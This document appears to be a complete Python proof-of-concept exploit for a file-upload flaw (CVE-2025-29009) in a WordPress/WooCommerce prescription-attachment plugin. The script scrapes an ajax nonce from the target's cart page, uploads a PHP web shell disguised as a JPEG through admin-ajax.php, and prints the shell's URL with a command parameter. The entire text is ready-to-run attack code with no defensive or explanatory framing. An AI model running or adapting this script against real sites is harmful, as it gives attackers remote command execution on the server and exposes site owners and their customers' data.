# Author: joshs-code Date: 2025-04-11, Purpose: CVE-2025-29009 POC script

import requests
import re


URL = input("Enter URL for target site: ")

s = requests.Session()
nonce_grab = s.get(f'{URL}/cart')
match = re.search(r'"ajaxNonce"\s*:\s*"([^"]+)"', nonce_grab.text)
nonce = match[1]

files = {
    'wkwc_pa_prescription_attachment[]': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')
}

data = {
    'type': 'upload',
    'nonce': nonce,
    'action': 'wkwcpa_handle_prescription_session'
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    'Referer': 'http://joshs-code',
    'Origin': 'http://joshs-code',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
}

response = requests.post(
    f"{URL}/wp-admin/admin-ajax.php",
    data=data,
    files=files,
    headers=headers,
    verify=False  
)

print("Status Code:", response.status_code)
print("Response Body:", response.text)

print("\nTRY SHELL AT:")
print(f"{URL}/wp-content/uploads/prescriptions/shell.php?cmd=whoami")